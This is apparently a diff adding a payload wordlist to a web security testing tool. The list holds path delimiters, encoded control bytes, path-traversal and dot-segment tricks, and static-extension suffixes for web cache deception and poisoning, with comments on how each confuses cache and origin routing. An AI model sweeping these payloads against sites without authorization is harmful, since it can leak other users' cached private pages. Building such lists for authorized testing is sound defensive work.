@@ -1,0 +1,80 @@
+# Cache-key delimiters and path-normalization tricks — for web cache deception and poisoning.
+# A fast-start set, not a wordlist manager; extend with a merge file for depth.
+# Blank lines and lines starting with '#' are comments (skipped at load).
+#
+# APPEND TO THE END OF THE PATH. Mark the end of the path (^K on the token, or a manual §)
+# and sweep this set: each entry is a suffix that may make the cache key differ from the
+# origin's routing key. A cache HIT on a suffix the origin ignores is the deception signal —
+# confirm it with a no-session re-request (see the cache-deception check).
+#
+# The delimiter that works is framework-specific: `;` is a Spring/Java matrix-param separator,
+# `.` a Rails/ASP.NET format hint, `%00` an OpenLiteSpeed truncation, `%0a`/`%0d`/`%09` a
+# header/line break some parsers stop at. One combined list rather than per-framework files —
+# an operator sweeps once and reads which one the target normalizes away.
+
+# Delimiter, then a cached static extension. The origin routes on the dynamic path; the cache
+# keys on the extension and stores the response.
+;.css
+;.js
+;.png
+;.jpg
+;.ico
+;.svg
+;.gif
+;.woff
+;.woff2
+;.json
+;.txt
+;.html
+
+# Bare delimiters — a matrix param, a fake path segment, a truncation the cache ignores.
+;
+;foo=bar
+;a=b
+!
+~
+@
+,
+$
+
+# Encoded control bytes — a parser that stops at one of these keys a shorter path than the
+# origin routes. Percent-encoded so they stay legible and survive the wire verbatim.
+%00
+%00.css
+%0a
+%0a.css
+%0d
+%0d.css
+%09
+%09.css
+%23
+%23.css
+%3f
+%3f.css
+%2500
+%250a
+
+# Path-segment suffix — a fake trailing segment the origin's router drops but the cache keys on.
+/nonexistent
+/nonexistent.css
+/..%2f
+/..;/
+/x/..%2f
+/%2e%2e/
+
+# Dot-segment normalization — the cache and the origin may collapse `..` differently.
+/..%2fstatic%2fx.css
+/%2e%2e%2fx.css
+..%2f..%2f
+/.%2e/
+
+# Encoding-based delimiters — a semicolon or newline hidden behind a second decode.
+%3b
+%3b.css
+%253b
+%2561
+
+# Static-directory suffix — many caches store anything under a known static prefix.
+/static/x.css
+/assets/x.css
+/x.css
